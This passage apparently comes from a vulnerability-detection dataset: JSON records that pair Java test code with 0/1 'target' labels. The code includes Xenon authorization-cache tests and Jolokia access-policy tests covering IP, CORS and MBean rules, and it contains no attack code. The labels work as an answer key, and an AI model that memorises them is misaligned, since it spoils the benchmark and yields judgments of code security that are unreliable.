Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                    .toString());\n            executor = this.host.allocateExecutor(s);\n            this.host.resetSystemAuthorizationContext();\n            for (int i = 0; i < this.serviceCount; i++) {\n                this.host.run(executor, () -> {\n                    String serviceName = UUID.randomUUID().toString();\n                    try {\n                        this.host.setSystemAuthorizationContext();\n                        Query resourceQuery = Query.Builder.create().addFieldClause(ExampleServiceState.FIELD_NAME_NAME,\n                                serviceName).build();\n                        String resourceGroupLink = authsetupHelper.createResourceGroup(this.host, serviceName, resourceQuery);\n                        authsetupHelper.createRole(this.host, userGroupLink, resourceGroupLink, EnumSet.allOf(Action.class));\n                        this.host.resetSystemAuthorizationContext();\n                        this.host.assumeIdentity(userLink);\n                        ExampleServiceState exampleState = new ExampleServiceState();\n                        exampleState.name = serviceName;\n                        exampleState.documentSelfLink = serviceName;\n                        // Issue: https://www.pivotaltracker.com/story/show/131520613\n                        // We have a potential race condition in the code where the role\n                        // created above is not being reflected in the auth context for\n                        // the user; We are retrying the operation to mitigate the issue\n                        // till we have a fix for the issue\n                        for (int retryCounter = 0; retryCounter < 3; retryCounter++) {\n                            try {\n                                this.host.sendAndWaitExpectSuccess(\n                                        Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                                        .setBody(exampleState));\n                                break;\n                            } catch (Throwable t) {\n                                this.host.log(Level.WARNING, \"Error creating example service: \" + t.getMessage());\n                                if (retryCounter == 2) {\n                                    ctx.fail(new IllegalStateException(\"Example service creation failed thrice\"));\n                                    return;\n                                }\n                            }\n                        }\n                        this.host.sendAndWaitExpectSuccess(\n                                Operation.createDelete(UriUtils.buildUri(this.host,\n                                        UriUtils.buildUriPath(ExampleService.FACTORY_LINK, serviceName))));\n                        ctx.complete();\n                    } catch (Throwable e) {\n                        this.host.log(Level.WARNING, e.getMessage());\n                        ctx.fail(e);\n                    }\n                });\n            }\n            this.host.testWait(ctx);\n        } finally {\n            if (executor != null) {\n                executor.shutdown();\n            }\n        }\n    }\n\n    @Test\n    public void testAuthzUtils() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        AuthorizationHelper authHelperForFoo = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String fooUserLink = authHelperForFoo.createUserService(this.host, email);\n        UserState patchState = new UserState();\n        patchState.userGroupLinks = new HashSet<String>();\n        patchState.userGroupLinks.add(UriUtils.buildUriPath(\n                UserGroupService.FACTORY_LINK, authHelperForFoo.getUserGroupName(email)));\n        authHelperForFoo.patchUserService(this.host, fooUserLink, patchState);\n        // create a user group based on a query for userGroupLink\n        authHelperForFoo.createRoles(this.host, email);\n        // spin up a privileged service to query for auth context\n        MinimalTestService s = new MinimalTestService();\n        this.host.addPrivilegedService(MinimalTestService.class);\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), null);\n        this.host.resetSystemAuthorizationContext();\n\n        String userGroupLink = authHelperForFoo.getUserGroupLink();\n        String resourceGroupLink = authHelperForFoo.getResourceGroupLink();\n        String roleLink = authHelperForFoo.getRoleLink();\n\n\n        // get the user group service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        Operation getUserGroupStateOp =\n                Operation.createGet(UriUtils.buildUri(this.host, userGroupLink));\n        Operation resultOp = this.host.waitForResponse(getUserGroupStateOp);\n        UserGroupState userGroupState = resultOp.getBody(UserGroupState.class);\n        Operation clearAuthOp = new Operation();\n        TestContext ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUserGroup(s, clearAuthOp, userGroupState);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // get the resource group and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        clearAuthOp = new Operation();\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, resourceGroupLink));\n        AuthorizationCacheUtils.clearAuthzCacheForResourceGroup(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // get the role service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        Operation getRoleStateOp =\n                Operation.createGet(UriUtils.buildUri(this.host, roleLink));\n        resultOp = this.host.waitForResponse(getRoleStateOp);\n        RoleState roleState = resultOp.getBody(RoleState.class);\n        clearAuthOp = new Operation();\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForRole(s, clearAuthOp, roleState);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n\n        // finally, get the user service and clear the authz cache\n        assertNotNull(assumeIdentityAndGetContext(fooUserLink, s, true));\n        this.host.setSystemAuthorizationContext();\n        clearAuthOp = new Operation();\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, fooUserLink));\n        ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUser(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n        assertNull(assumeIdentityAndGetContext(fooUserLink, s, false));\n    }\n\n    private void verifyJaneAccess(Map<URI, ExampleServiceState> exampleServices, String authToken) throws Throwable {\n        // Try to GET all example services\n        this.host.testStart(exampleServices.size());\n        for (Entry<URI, ExampleServiceState> entry : exampleServices.entrySet()) {\n            Operation get = Operation.createGet(entry.getKey());\n            // force to create a remote context\n            if (authToken != null) {\n                get.forceRemote();\n                get.getRequestHeaders().put(Operation.REQUEST_AUTH_TOKEN_HEADER, authToken);\n            }\n            if (entry.getValue().name.equals(\"jane\")) {\n                // Expect 200 OK\n                get.setCompletion((o, e) -> {\n                    if (o.getStatusCode() != Operation.STATUS_CODE_OK) {\n                        String message = String.format(\"Expected %d, got %s\",\n                                Operation.STATUS_CODE_OK,\n                                o.getStatusCode());\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n                    ExampleServiceState body = o.getBody(ExampleServiceState.class);\n                    if (!body.documentAuthPrincipalLink.equals(this.userServicePath)) {\n                        String message = String.format(\"Expected %s, got %s\",\n                                this.userServicePath, body.documentAuthPrincipalLink);\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n                    this.host.completeIteration();\n                });\n            } else {\n                // Expect 403 Forbidden\n                get.setCompletion((o, e) -> {\n                    if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                        String message = String.format(\"Expected %d, got %s\",\n                                Operation.STATUS_CODE_FORBIDDEN,\n                                o.getStatusCode());\n                        this.host.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n\n                    this.host.completeIteration();\n                });\n            }\n\n            this.host.send(get);\n        }\n        this.host.testWait();\n    }\n\n    private void assertAuthorizedServicesInResult(String name,\n            Map<URI, ExampleServiceState> exampleServices,\n            ServiceDocumentQueryResult result) {\n        Set<String> selfLinks = new HashSet<>(result.documentLinks);\n        for (Entry<URI, ExampleServiceState> entry : exampleServices.entrySet()) {\n            String selfLink = entry.getKey().getPath();\n            if (entry.getValue().name.equals(name)) {\n                assertTrue(selfLinks.contains(selfLink));\n            } else {\n                assertFalse(selfLinks.contains(selfLink));\n            }\n        }\n    }\n\n    private String generateAuthToken(String userServicePath) throws GeneralSecurityException {\n        Claims.Builder builder = new Claims.Builder();\n        builder.setSubject(userServicePath);\n        Claims claims = builder.getResult();\n        return this.host.getTokenSigner().sign(claims);\n    }\n\n    private ExampleServiceState createExampleServiceState(String name, Long counter) {\n        ExampleServiceState state = new ExampleServiceState();\n        state.name = name;\n        state.counter = counter;\n        state.documentAuthPrincipalLink = \"stringtooverwrite\";\n        return state;\n    }\n\n    private Map<URI, ExampleServiceState> createExampleServices(String userName) throws Throwable {\n        Collection<ExampleServiceState> bodies = new LinkedList<>();\n        for (int i = 0; i < this.serviceCount; i++) {\n            bodies.add(createExampleServiceState(userName, 1L));\n        }\n\n        Iterator<ExampleServiceState> it = bodies.iterator();\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(it.next());\n        };\n\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(\n                null,\n                bodies.size(),\n                ExampleServiceState.class,\n                bodySetter,\n                UriUtils.buildFactoryUri(this.host, ExampleService.class));\n\n        return states;\n    }\n}\n", "target": 1}
{"idx": 1057, "func": "package org.jolokia.restrictor;\n\n/*\n * Copyright 2009-2013 Roland Huss\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *       http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport java.io.InputStream;\n\nimport javax.management.MalformedObjectNameException;\nimport javax.management.ObjectName;\n\nimport org.jolokia.util.HttpMethod;\nimport org.jolokia.util.RequestType;\nimport org.testng.annotations.Test;\n\nimport static org.testng.Assert.*;\nimport static org.testng.AssertJUnit.assertEquals;\nimport static org.testng.AssertJUnit.assertTrue;\n\n/**\n * @author roland\n * @since Jul 29, 2009\n */\npublic class PolicyBasedRestrictorTest {\n\n    @Test\n    public void basics() throws MalformedObjectNameException {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample1.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"Verbose\"));\n        assertFalse(restrictor.isAttributeWriteAllowed(new ObjectName(\"java.lang:type=Memory\"),\"Verbose\"));\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"NonHeapMemoryUsage\"));\n        assertTrue(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Memory\"),\"gc\"));\n        assertFalse(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Threading\"),\"gc\"));\n        assertTrue(restrictor.isHttpMethodAllowed(HttpMethod.POST));\n        assertFalse(restrictor.isHttpMethodAllowed(HttpMethod.GET));\n    }\n\n    @Test\n    public void restrictIp() {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample1.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        String ips[][] = {\n                { \"11.0.18.32\", \"true\" },\n                { \"planck\", \"true\" },\n                { \"heisenberg\", \"false\" },\n                { \"10.0.11.125\", \"true\" },\n                { \"10.0.11.126\", \"false\" },\n                { \"11.1.18.32\", \"false\" },\n                { \"192.168.15.3\", \"true\" },\n                { \"192.168.15.8\", \"true\" },\n                { \"192.168.16.3\", \"false\" }\n        };\n\n        for (String check[] : ips) {\n            String res = restrictor.isRemoteAccessAllowed(check[0]) ? \"true\" : \"false\";\n            assertEquals(\"Ip \" + check[0] + \" is \" +\n                         (check[1].equals(\"false\") ? \"not \" : \"\") +\n                         \"allowed\",check[1],res);\n        }\n    }\n\n    @Test\n    public void patterns() throws MalformedObjectNameException {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample2.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"HeapMemoryUsage\"));\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"NonHeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"jolokia:type=Config,name=Bla\"),\"Debug\"));\n        assertFalse(restrictor.isOperationAllowed(new ObjectName(\"jolokia:type=Threading\"),\"gc\"));\n\n        // No hosts set.\n        assertTrue(restrictor.isRemoteAccessAllowed(\"10.0.1.125\"));\n\n    }\n\n    @Test\n    public void noRestrictions() throws MalformedObjectNameException {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample3.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"HeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"NonHeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"jolokia:type=Config,name=Bla\"),\"Debug\"));\n        assertTrue(restrictor.isOperationAllowed(new ObjectName(\"jolokia:type=Threading\"),\"gc\"));\n        assertTrue(restrictor.isTypeAllowed(RequestType.READ));\n        assertTrue(restrictor.isHttpMethodAllowed(HttpMethod.GET));\n        assertTrue(restrictor.isHttpMethodAllowed(HttpMethod.POST));\n    }\n\n\n    @Test\n    public void deny() throws MalformedObjectNameException {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample4.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"HeapMemoryUsage\"));\n        assertFalse(restrictor.isAttributeWriteAllowed(new ObjectName(\"java.lang:type=Memory\"),\"HeapMemoryUsage\"));\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"NonHeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeWriteAllowed(new ObjectName(\"java.lang:type=Memory\"),\"NonHeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"),\"BlaUsage\"));\n\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"jolokia:type=Config\"),\"Debug\"));\n\n        assertFalse(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Blubber,name=x\"),\"gc\"));\n        assertTrue(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Blubber,name=x\"),\"xavier\"));\n    }\n\n    @Test\n    public void allow() throws MalformedObjectNameException {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample5.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"), \"HeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeWriteAllowed(new ObjectName(\"java.lang:type=Memory\"), \"HeapMemoryUsage\"));\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"), \"NonHeapMemoryUsage\"));\n        assertFalse(restrictor.isAttributeWriteAllowed(new ObjectName(\"java.lang:type=Memory\"), \"NonHeapMemoryUsage\"));\n        assertFalse(restrictor.isAttributeReadAllowed(new ObjectName(\"java.lang:type=Memory\"), \"BlaUsage\"));\n\n        assertTrue(restrictor.isAttributeReadAllowed(new ObjectName(\"jolokia:type=Config\"), \"Debug\"));\n\n        assertTrue(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Blubber,name=x\"), \"gc\"));\n        assertFalse(restrictor.isOperationAllowed(new ObjectName(\"java.lang:type=Blubber,name=x\"), \"xavier\"));\n    }\n\n    @Test\n    public void illegalXml() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal1.xml\");\n        try {\n            PolicyRestrictor restrictor = new PolicyRestrictor(is);\n            fail(\"Could parse illegal file\");\n        } catch (SecurityException exp) {\n            //ok\n        }\n\n        try {\n            new PolicyRestrictor(null);\n            fail(\"No file given\");\n        } catch (SecurityException exp) {\n            // ok\n        }\n    }\n\n    @Test\n    public void noName() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal2.xml\");\n        try {\n            PolicyRestrictor restrictor = new PolicyRestrictor(is);\n            fail(\"Could parse illegal file\");\n        } catch (SecurityException exp) {\n            assertTrue(exp.getMessage().contains(\"name\"));\n        }\n    }\n\n    @Test\n    public void invalidTag() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal3.xml\");\n        try {\n            PolicyRestrictor restrictor = new PolicyRestrictor(is);\n            fail(\"Could parse illegal file\");\n        } catch (SecurityException exp) {\n            assertTrue(exp.getMessage().contains(\"name\"));\n            assertTrue(exp.getMessage().contains(\"attribute\"));\n            assertTrue(exp.getMessage().contains(\"operation\"));\n            assertTrue(exp.getMessage().contains(\"bla\"));\n        }\n    }\n\n    @Test\n    public void doubleName() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal4.xml\");\n        try {\n            PolicyRestrictor restrictor = new PolicyRestrictor(is);\n            fail(\"Could parse illegal file\");\n        } catch (SecurityException exp) {\n            assertTrue(exp.getMessage().contains(\"name\"));\n        }\n\n    }\n\n\n    @Test\n    public void httpMethod() {\n        InputStream is = getClass().getResourceAsStream(\"/method.xml\");\n        PolicyRestrictor res = new PolicyRestrictor(is);\n        assertTrue(res.isHttpMethodAllowed(HttpMethod.GET));\n        assertTrue(res.isHttpMethodAllowed(HttpMethod.POST));\n    }\n\n    @Test\n    public void illegalHttpMethod() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal5.xml\");\n        try {\n            new PolicyRestrictor(is);\n            fail();\n        } catch (SecurityException exp) {\n            assertTrue(exp.getMessage().contains(\"BLA\"));\n        }\n    }\n\n    @Test\n    public void illegalHttpMethodTag() {\n        InputStream is = getClass().getResourceAsStream(\"/illegal6.xml\");\n        try {\n            new PolicyRestrictor(is);\n            fail();\n        } catch (SecurityException exp) {\n            assertTrue(exp.getMessage().contains(\"method\"));\n            assertTrue(exp.getMessage().contains(\"blubber\"));\n        }\n    }\n\n    @Test\n    public void cors() {\n        InputStream is = getClass().getResourceAsStream(\"/allow-origin4.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        for (boolean strict : new boolean[] {true, false}) {\n            assertTrue(restrictor.isOriginAllowed(\"http://bla.com\", strict));\n            assertFalse(restrictor.isOriginAllowed(\"http://www.jolokia.org\", strict));\n            assertTrue(restrictor.isOriginAllowed(\"https://www.consol.de\", strict));\n        }\n    }\n\n    @Test\n    public void corsStrictCheckingOff() {\n        InputStream is = getClass().getResourceAsStream(\"/allow-origin1.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        // Allways true since we want a strict check but strict checking is off.\n        assertTrue(restrictor.isOriginAllowed(\"http://bla.com\", true));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.jolokia.org\", true));\n        assertTrue(restrictor.isOriginAllowed(\"https://www.consol.de\", true));\n    }\n\n    @Test\n    public void corsWildCard() {\n        InputStream is = getClass().getResourceAsStream(\"/allow-origin2.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        assertTrue(restrictor.isOriginAllowed(\"http://bla.com\", false));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.jolokia.org\", false));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.consol.de\", false));\n    }\n\n    @Test\n    public void corsEmpty() {\n        InputStream is = getClass().getResourceAsStream(\"/allow-origin3.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        assertTrue(restrictor.isOriginAllowed(\"http://bla.com\", false));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.jolokia.org\", false));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.consol.de\", false));\n    }\n\n    @Test\n    public void corsNoTags() {\n        InputStream is = getClass().getResourceAsStream(\"/access-sample1.xml\");\n        PolicyRestrictor restrictor = new PolicyRestrictor(is);\n\n        assertTrue(restrictor.isOriginAllowed(\"http://bla.com\", false));\n        assertTrue(restrictor.isOriginAllowed(\"http://www.jolokia.org\", false));\n        assertTrue(restrictor.isOriginAllowed(\"https://www.consol.de\", false));\n    }\n\n\n}\n", "target": 0}
{"idx": 1058, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertTrue;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Consumer;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.ServiceStatLogHistogram;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.AggregationType;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.TimeBin;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\npublic class TestUtilityService extends BasicReusableHostTestCase {\n\n    @Before\n    public void setUp() {\n        // We tell the verification host that we re-use it across test methods. This enforces\n        // the use of TestContext, to isolate test methods from each other.\n        // In this test class we host.testCreate(count) to get an isolated test context and\n        // then either wait on the context itself, or ask the convenience method host.testWait(ctx)\n        // to do it for us.\n        this.host.setSingleton(true);\n    }\n\n    @Test\n    public void patchConfiguration() throws Throwable {\n        int count = 10;\n\n        host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n        // try config patch on a factory\n        ServiceConfigUpdateRequest updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.removeOptions = EnumSet.of(ServiceOption.IDEMPOTENT_POST);\n        TestContext ctx = this.testCreate(1);\n\n        URI configUri = UriUtils.buildConfigUri(host, ExampleService.FACTORY_LINK);\n        this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                .setCompletion(ctx.getCompletion()));\n\n        this.testWait(ctx);\n\n        TestContext ctx2 = this.testCreate(1);\n        // verify option removed\n        this.host.send(Operation.createGet(configUri).setCompletion((o, e) -> {\n            if (e != null) {\n                ctx2.failIteration(e);\n                return;\n            }\n\n            ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n            if (!cfg.options.contains(ServiceOption.IDEMPOTENT_POST)) {\n                ctx2.completeIteration();\n            } else {\n                ctx2.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n            }\n\n        }));\n\n        this.testWait(ctx2);\n\n        List<URI> services = this.host.createExampleServices(this.host, count, null);\n\n        updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.addOptions = EnumSet.of(ServiceOption.PERIODIC_MAINTENANCE);\n        updateBody.peerNodeSelectorPath = ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR;\n        ctx = this.testCreate(services.size());\n        for (URI u : services) {\n            configUri = UriUtils.buildConfigUri(u);\n            this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                    .setCompletion(ctx.getCompletion()));\n        }\n        this.testWait(ctx);\n\n        // get configuration and verify options\n        TestContext ctx3 = testCreate(services.size());\n        for (URI serviceUri : services) {\n            URI u = UriUtils.buildConfigUri(serviceUri);\n            host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                if (e != null) {\n                    ctx3.failIteration(e);\n                    return;\n                }\n                ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n                if (!cfg.options.contains(ServiceOption.PERIODIC_MAINTENANCE)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n\n                if (!ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR.equals(cfg.peerNodeSelectorPath)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n                ctx3.completeIteration();\n            }));\n        }\n        testWait(ctx3);\n\n        // since we enabled periodic maintenance, verify the new maintenance related stat is present\n        this.host.waitFor(\"maintenance stat not present\", () -> {\n            for (URI u : services) {\n                Map<String, ServiceStat> stats = this.host.getServiceStats(u);\n                ServiceStat maintStat = stats.get(Service.STAT_NAME_MAINTENANCE_COUNT);\n                if (maintStat == null) {\n                    return false;\n                }\n                if (maintStat.latestValue == 0) {\n                    return false;\n                }\n            }\n            return true;\n        });\n\n    }\n\n    @Test\n    public void redirectToUiServiceIndex() throws Throwable {\n        // create an example child service and also verify it has a default UI html page\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = UUID.randomUUID().toString();\n        s.documentSelfLink = s.name;\n        Operation post = Operation\n                .createPost(UriUtils.buildFactoryUri(this.host, ExampleService.class))\n                .setBody(s);\n        this.host.sendAndWaitExpectSuccess(post);\n\n        // do a get on examples/ui and examples/<uuid>/ui, twice to test the code path that caches\n        // the resource file lookup\n        for (int i = 0; i < 2; i++) {\n            Operation htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n\n            htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK, s.name,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n        }\n    }\n\n    @Test\n    public void statRESTActions() throws Throwable {\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        long c = 2;\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stat.unit = \"unit\";\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 3 - POST a stat with the same key again and verify that the\n        // version and accumulated value are updated\n        stat.latestValue = 50;\n        stat.unit = \"unit1\";\n        Long updatedMicrosUtc1 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc1;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        // Step 4 - POST a stat with a new key and verify that the\n        // previously posted stat is not updated\n        stat.name = \"key2\";\n        stat.latestValue = 50;\n        stat.unit = \"unit2\";\n        Long updatedMicrosUtc2 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc2;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        retStatEntry = allStats.entries.get(\"key2\");\n        assertTrue(retStatEntry.accumulatedValue == 50);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit2\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc2);\n\n        // Step 5 - Issue a PUT for the first stat key and verify that the doc state is replaced\n        stat.name = \"key1\";\n        stat.latestValue = 75;\n        stat.unit = \"replaceUnit\";\n        stat.sourceTimeMicrosUtc = null;\n        